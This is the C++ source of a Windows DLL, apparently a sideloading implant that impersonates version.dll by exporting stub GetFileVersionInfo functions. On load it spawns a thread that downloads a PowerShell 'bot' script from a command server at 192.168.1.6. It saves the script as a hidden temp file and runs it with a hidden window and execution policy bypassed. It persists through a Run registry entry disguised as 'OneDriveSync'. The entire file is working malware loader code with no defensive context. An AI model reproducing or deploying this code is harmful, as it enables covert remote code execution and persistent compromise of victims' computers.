#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

void payload_main() {
    // DEBUG: crear archivo para confirmar que el payload corre
    HANDLE hDbg = CreateFileA("C:\\Users\\Public\\c2_debug.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDbg != INVALID_HANDLE_VALUE) {
        char m[] = "Payload ejecutado - descargando bot...\n"; DWORD w;
        WriteFile(hDbg, m, strlen(m), &w, NULL); CloseHandle(hDbg);
    }
    
    Sleep(2000);
    
    HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInet) return;
    
    char url[256];
    snprintf(url, sizeof(url), "http://192.168.1.6:8000/static/payloads/bot_clear.ps1");
    
    HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) { InternetCloseHandle(hInet); return; }
    
    BYTE buf[4096];
    DWORD br, tot = 0;
    BYTE* payload = (BYTE*)VirtualAlloc(NULL, 500000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    
    while (InternetReadFile(hUrl, buf, sizeof(buf), &br) && br > 0) {
        memcpy(payload+tot, buf, br); tot += br;
    }
    payload[tot] = 0;
    InternetCloseHandle(hUrl); InternetCloseHandle(hInet);
    
    // DEBUG: escribir que se descargó
    hDbg = CreateFileA("C:\\Users\\Public\\c2_debug.txt", FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDbg != INVALID_HANDLE_VALUE) {
        char m[256]; DWORD w;
        snprintf(m, sizeof(m), "Descargados %d bytes\n", tot);
        WriteFile(hDbg, m, strlen(m), &w, NULL); CloseHandle(hDbg);
    }
    
    char tmp[MAX_PATH], ps[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    snprintf(ps, sizeof(ps), "%s\\sysupdate.ps1", tmp);
    
    HANDLE hf = CreateFileA(ps, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(hf, payload, tot, &w, NULL); CloseHandle(hf);
    }
    
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File \"%s\"", ps);
    
    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "OneDriveSync", 0, REG_SZ, (BYTE*)cmd, strlen(cmd)+1);
        RegCloseKey(hk);
    }
}

extern "C" __declspec(dllexport) DWORD __stdcall GetFileVersionInfoSizeA(LPCSTR a, LPDWORD b) { 
    if(b) *b = 0; return 1; 
}
extern "C" __declspec(dllexport) BOOL __stdcall GetFileVersionInfoA(LPCSTR a, DWORD b, DWORD c, LPVOID d) { 
    return TRUE; 
}
extern "C" __declspec(dllexport) BOOL __stdcall VerQueryValueA(LPCVOID a, LPCSTR b, LPVOID* c, PUINT d) { 
    return FALSE; 
}

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID res) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        // Crear thread para el payload (evitar loader lock)
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload_main, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
